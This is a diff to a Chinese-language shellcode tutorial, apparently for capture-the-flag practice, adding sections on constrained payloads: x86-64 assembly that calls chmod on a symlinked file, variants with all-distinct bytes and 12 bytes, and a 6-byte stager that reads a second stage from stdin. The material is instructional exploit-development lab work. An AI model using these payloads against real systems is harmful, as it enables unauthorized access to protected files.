@@ -20,6 +20,9 @@ comments: true
   - [6.1 直接编写shellcode](#61-直接编写shellcode)
   - [6.2 shellcode作为跳板，执行其他程序](#62-shellcode作为跳板执行其他程序)
   - [6.3 18字节shellcode](#63-18字节shellcode)
+  - [6.4 独一无二的shellcode](#64-独一无二的shellcode)
+  - [6.5 12字节的shellcode](#65-12字节的shellcode)
+  - [6.6 6字节shellcode](#66-6字节shellcode)
 
 
 ## 1. 介绍: shellcode是什么<br>
@@ -298,8 +301,65 @@ _start:
         push 0x66
         mov rdi, rsp
         push 4
-        pop rsi
+        #jmp _stage #跳过某些位置，这些位置会被程序设置为int 3导致 shellcode无法执行
+        #nop 
+        #.fill 10,1, 0x90 # fill with nop
+_stage:
+        pop rsi # 5e
         push 90 # sys_chmod
+        pop rax
+        syscall
+        ret
+        ret
+        ret #c3 增加点代码，防止冒泡排序打乱shellcode
+```
+
+### 6.4 独一无二的shellcode<br>
+如果要求输入的`shellcode`每个字节都不一样，可以这么写:<br>
+```
+.global _start
+_start:
+.intel_syntax noprefix
+        push 0x67  # 软链接的名称就是g
+        push rsp
+        pop rdi
+        mov sil, 4
+        mov ax,90
+        syscall
+```
+
+### 6.5 12字节的shellcode<br>
+如果字节数更低，该怎么办！<br>
+```
+.global _start
+_start:
+.intel_syntax noprefix
+        push 0x67  # 软链接的名称就是g
+        push rsp
+        pop rdi
+        mov sil, 4
+        push 90
+        pop rax
+        syscall
+```
+
+### 6.6 6字节shellcode<br>
+这其实有点难了，需要能够调试程序，知道程序当前的寄存器分布，才有可能利用<br>
+
+```
+.global _start
+_start:
+.intel_syntax noprefix
+        xor edi,edi   # 0, stdin
+        push rdx     # rdx=shellcode addr
+        pop rsi
+        syscall     # read, rax=0(default)
+        .fill 0x6, 1, 0x90
+        push 0x66
+        mov rdi, rsp
+        push 4
+        pop rsi
+        push 90
         pop rax
         syscall
 ```
